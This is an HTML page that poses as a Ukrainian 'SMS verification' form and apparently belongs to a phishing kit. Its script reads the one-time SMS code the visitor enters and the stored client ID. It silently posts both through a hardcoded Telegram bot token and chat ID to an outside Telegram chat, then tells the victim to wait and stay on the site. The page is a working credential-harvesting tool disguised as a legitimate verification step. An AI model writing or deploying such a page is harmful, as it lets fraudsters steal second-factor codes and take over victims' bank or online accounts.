<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Дополнительно</title>

<style>
body{
  font-family:Arial;
  background:#f1f5f9;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box{
  background:white;
  padding:25px;
  border-radius:15px;
  width:320px;
  text-align:center;
}

input{
  width:100%;
  padding:10px;
  margin-top:10px;
}

button{
  width:100%;
  padding:12px;
  margin-top:10px;
  background:#3b82f6;
  color:white;
  border:none;
  border-radius:10px;
}
</style>
</head>

<body>

<div class="box">
  <h2>Смс Верифікація</h2>

  <input id="extra" placeholder="Введіть код із смс">

  <button onclick="sendExtra()">Відправити</button>

  <p id="done" style="margin-top:10px;"></p>
</div>

<script>
function sendExtra(){

  const extra = document.getElementById("extra").value;
  const clientId = localStorage.getItem("clientId");

  if(!extra){
    alert("Введіть данні!");
    return;
  }

  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
  const chat_id = "8035773808";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:chat_id,
      text:
`📩 СМС/КОД №${clientId}

${extra}`
    })
  });

  document.getElementById("done").innerText = "Дякую очікуйте відповіді, залишайтесь на сайті!";
}
</script>

</body>
</html>
